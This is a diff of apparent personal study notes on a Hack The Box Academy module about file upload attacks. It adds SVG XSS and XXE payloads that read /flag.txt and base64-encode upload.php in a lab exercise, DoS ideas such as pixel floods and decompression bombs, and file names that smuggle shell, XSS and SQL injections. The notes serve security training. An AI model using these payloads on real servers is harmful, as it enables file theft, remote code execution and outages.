@@ -19,14 +19,13 @@ Finally, XSS attacks can also be carried with `SVG` images, along with several o
 
 &#x20;For example, we can write the following to `HTB.svg`:
 
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
-    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
-    <script type="text/javascript">alert(window.origin);</script>
-</svg>
-```
+<pre class="language-xml"><code class="lang-xml"><strong>&#x3C;?xml version="1.0" encoding="UTF-8"?>
+</strong>&#x3C;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+&#x3C;svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    &#x3C;rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    &#x3C;script type="text/javascript">alert(window.origin);&#x3C;/script>
+&#x3C;/svg>
+</code></pre>
 
 ***
 
@@ -55,3 +54,57 @@ Once the SVG image is displayed, we should get the base64 encoded content of `in
 ***
 
 ## DoS
+
+Furthermore, we can utilize a `Decompression Bomb` with file types that use data compression, like `ZIP` archives.
+
+Another possible DoS attack is a `Pixel Flood` attack with some image files that utilize image compression, like `JPG` or `PNG`. We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels.&#x20;
+
+When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.
+
+
+
+&#x20;One way is uploading an overly large file, as some upload forms may not limit the upload file size or check for it before uploading it, which may fill up the server's hard drive and cause it to crash or slow down considerably.
+
+If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. `../../../etc/passwd`), which may also cause the server to crash. `Try to search for other examples of DOS attacks through a vulnerable file upload functionality`.
+
+***
+
+### PoCs - Questions
+
+* The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"
+
+First i make a .svg image -->
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
+<svg>&xxe;</svg>
+```
+
+> We can use: etc/passwd but, we need read the flag into /
+
+Then, examinate the source code and see the flag -->
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)
+
+We can use a XXE with base64 encode to read local archive with name upload.php, and it get us a enconde line -->
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+<svg>&xxe;</svg>
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+> Decode it and u have the content of upload.php jeje
+
+***
+
+## Injections in File Name
+
+For example, if we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`), then our file name would inject the `whoami` command, which would get executed, leading to remote code execution. You may refer to the [Command Injections](https://academy.hackthebox.com/module/details/109) module for more information.
+
+Similarly, we may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.
